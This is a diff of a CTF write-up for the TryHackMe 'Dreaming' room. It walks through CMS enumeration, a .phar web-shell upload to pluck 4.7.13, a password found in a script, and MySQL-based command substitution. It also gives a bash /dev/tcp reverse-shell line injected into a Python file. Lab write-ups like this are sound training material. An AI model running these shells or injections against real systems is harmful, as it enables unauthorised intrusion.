@@ -8,8 +8,8 @@ image:
 
 description: "Dreaming walkthrough covering web application enumeration, Lateral Movement and command substitution ( MySQL injection)"
   
-categories: [TryHackMe, Web]
-tags: [ssrf, ssti, rabbitmq, erlang, jwt, web-exploitation]
+categories: [Web, Linux]
+tags: [web, linux, nmap, command substitution, MySQL injection, web-exploitation]
 
 level: Easy
 platform: TryHackMe
@@ -20,8 +20,10 @@ type: "CTF Write-up"
 status: Completed
 ---
 
-The room involved `web application enumeration`, `Lateral Movement` and `command substitution ( MySQL injection)`.
-This is a detailed walkthrough of how I rooted the **Dreaming** room on TryHackMe and captured both user and root flags. 
+## Overview :
+
+This is a detailed walkthrough of how I rooted the **Dreaming** room on TryHackMe and captured both user and root flags. The room involved `web application enumeration`, `Lateral Movement` and `command substitution ( MySQL injection)`.
+
 
 ---
 
@@ -49,22 +51,22 @@ Accessing port 80 initially led nowhere. just the default apach2 page, nothing s
 ```bash
 gobuster dir -u http://10.49.188.89 -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
-![Nmap](/assets/images/writeups/dreaming/dreaming1.png)
+![Enumeration](/assets/images/writeups/dreaming/dreaming1.png)
 
  we got a hit with **/app**, let' see what's there.
  okey, so from what we clicked we know that this site runs `pluck 4.7.13` which is a content management system (CMS), we see in the bottom `admin`, and when clicking that we get a login page.
  
- ![Nmap](/assets/images/writeups/dreaming/dreaming2.png)
+ ![Enumeration](/assets/images/writeups/dreaming/dreaming2.png)
  
 since we have no other choice, let's try some common passwords, and shortly after we get the right one which is `pa <REDACTED> rd`
 
 now i was in the administration dashboard, after searching i came to findout that this CMS version has vulnerabilities, and i found one, it's vulnerable to `File Upload Remote Code Execution` and i see the exploit from ExploitDB.
  
- ![Nmap](/assets/images/writeups/dreaming/dreaming3.png)
+ ![Enumeration](/assets/images/writeups/dreaming/dreaming3.png)
  
- ![Nmap](/assets/images/writeups/dreaming/dreaming4.webp)
+ ![Enumeration](/assets/images/writeups/dreaming/dreaming4.webp)
  
- ![Nmap](/assets/images/writeups/dreaming/dreaming5.webp)
+ ![Enumeration](/assets/images/writeups/dreaming/dreaming5.webp)
  
 after checking that python exploit, we find that it's uploading a `.phar` file (which is one of many other php extensions) that contains a web shell, since we know the way let's do that manually.
 
@@ -74,7 +76,7 @@ after checking that python exploit, we find that it's uploading a `.phar` file (
 **http://<target-ip>/app/pluck-4.7.13/admin.php?action=files**
 here in this url i uploaded php reverse shell `reverse_shell.phar` and started the listener after files gets called i got the reverse connection.
 
- ![Nmap](/assets/images/writeups/dreaming/dreaming7.png)
+ ![Exploitation](/assets/images/writeups/dreaming/dreaming7.png)
  
 ---
 
@@ -82,7 +84,7 @@ here in this url i uploaded php reverse shell `reverse_shell.phar` and started t
 
 **lucien**
 
- ![Nmap](/assets/images/writeups/dreaming/dreaming8.png)
+ ![Lateral Movement lucien](/assets/images/writeups/dreaming/dreaming8.png)
  
 ```bash
 cat /etc/passwd | grep 'bash'
@@ -94,7 +96,7 @@ cat test.py
 ```
 checking those files i find a password in `test.py` of user lucien. 
 
- ![Nmap](/assets/images/writeups/dreaming/dreaming9.png)
+ ![Lateral Movement lucien](/assets/images/writeups/dreaming/dreaming9.png)
  
 **death**
 
@@ -103,7 +105,7 @@ sudo -l
 ```
 again enumerating to for user death, i see that we i can run `/usr/bin/python3 /home/death/getDreams.py` as the user.
 
-![Nmap](/assets/images/writeups/dreaming/dreaming10.png)
+![Lateral Movement death](/assets/images/writeups/dreaming/dreaming10.png)
 
 ```bash
 cat /home/death/getDreams.py
@@ -117,14 +119,14 @@ I did however, run `ls -lah` and found a `.bash_history` as well as a `.mysql_hi
 ```mysql
 insert into dreams (dreamer, dream) values (‘whoami | bash’, ‘-l’);
 ```
-![Nmap](/assets/images/writeups/dreaming/dreaming11.png)
+![Lateral Movement death](/assets/images/writeups/dreaming/dreaming11.png)
 
 ```bash
 sudo -u death /usr/bin/python3 /home/death/getDreams.py
 ```
 i see that the test payload command was executed, that's the same concept i want to apply to get command execution as death.
 
-![Nmap](/assets/images/writeups/dreaming/dreaming12.png)
+![Lateral Movement death](/assets/images/writeups/dreaming/dreaming12.png)
 
 now let's add another dream (nightmare) in the table in form of `$(reverse shell)` :
 
@@ -141,7 +143,7 @@ sudo -u death /usr/bin/python3 /home/death/getDreams.py
 ```
 and i got a shell as `death`, one user left, `morpheus`.
 
-![Nmap](/assets/images/writeups/dreaming/dreaming14.png)
+![Lateral Movement morpheus](/assets/images/writeups/dreaming/dreaming14.png)
 
 **morpheus**
 
@@ -167,7 +169,7 @@ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/<target-ip>/4444 0>&1'\
 ```
 after waiting for a while, i got the reverse-connection and got the 3rd flag too.
 
-![Nmap](/assets/images/writeups/dreaming/dreaming15.png)
+![Root Flag](/assets/images/writeups/dreaming/dreaming15.png)
 
 ---
 
